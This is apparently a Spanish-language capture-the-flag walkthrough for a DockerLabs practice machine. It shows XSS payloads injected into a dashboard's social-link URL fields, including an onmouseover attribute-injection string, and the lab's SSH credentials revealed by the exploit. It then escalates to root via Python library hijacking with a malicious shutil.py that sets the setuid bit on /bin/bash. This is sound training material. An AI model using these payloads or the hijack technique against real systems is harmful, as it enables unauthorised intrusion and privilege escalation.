## Reconocimiento:

Puerto 22  : SSH

Puerto 80 : HTTP

Revisando la web hay una copia de una versión antigua de DockerLabs. Nos regalan una pista indicando que la vulnerabilidad esta en /dashboard y por el nombre de la máquina se sabe que es un XSS.

```bash
http://172.17.0.2/dashboard.php
```

Dentro hay varios parámetros que podrían ser vulnerables, pruebo todos con algo básico para ver comportamiento:

```bash
<script>alert('XSS')</script>
```

No funciona, pero en los parámetros de redes sociales pide una URL valida, por lo que concateno a la URL un XSS:

```bash
https://linkedin.com/test\"><script>alert('XSS')</script>
```

Lo acepta pero no tengo manera de ejecutarlo, así que creare una máquina para tener donde ejecutarlo cuando funcione:

```bash
http://172.17.0.2:5000/add-maquina
```

Lleno los datos y la máquina se ve en la parte inferior del menú de maquinas.

Investigando que podría hacer encuentro:

***Onmouseover:** es un evento en desarrollo web (HTML/JavaScript) que se dispara cuando el puntero del ratón entra y se posiciona sobre un elemento HTML específico en una página.*

Es perfecto ya que el link de redes es visible al interactuar con la máquina que creamos.

Desde /dashboard edito el link a:

```bash
https://linkedin.com/test\"onmouseover=\"alert('R4UL7T0')
```

Lo actualizo y al momento de pasar el mouse sobre el link aparece el texto “R4UL7T0”.

Saltando un pop up con las credenciales SSH:

```bash
chocolate:chocolatito123
```

## Escalada

```bash
sudo -l
(root) SETENV: NOPASSWD: /usr/bin/python3 /usr/local/bin/cleanup.py
```

Parece ser un script que borra los archivos de la carpeta /tmp. Es evidente la vulnerabilidad: Python Library Hijacking ya que esta usando la librería shutil.

Me dirijo a la carpeta /tmp:

```bash
cd /tmp
```

Creo el script malicioso:

shutil.py

```python
import os; os.system("chmod +s /bin/bash")
```

Lo ejecuto:

```bash
sudo PYTHONPATH=/tmp /usr/bin/python3 /usr/local/bin/cleanup.py
```

```bash
bash -p
```

Listo.
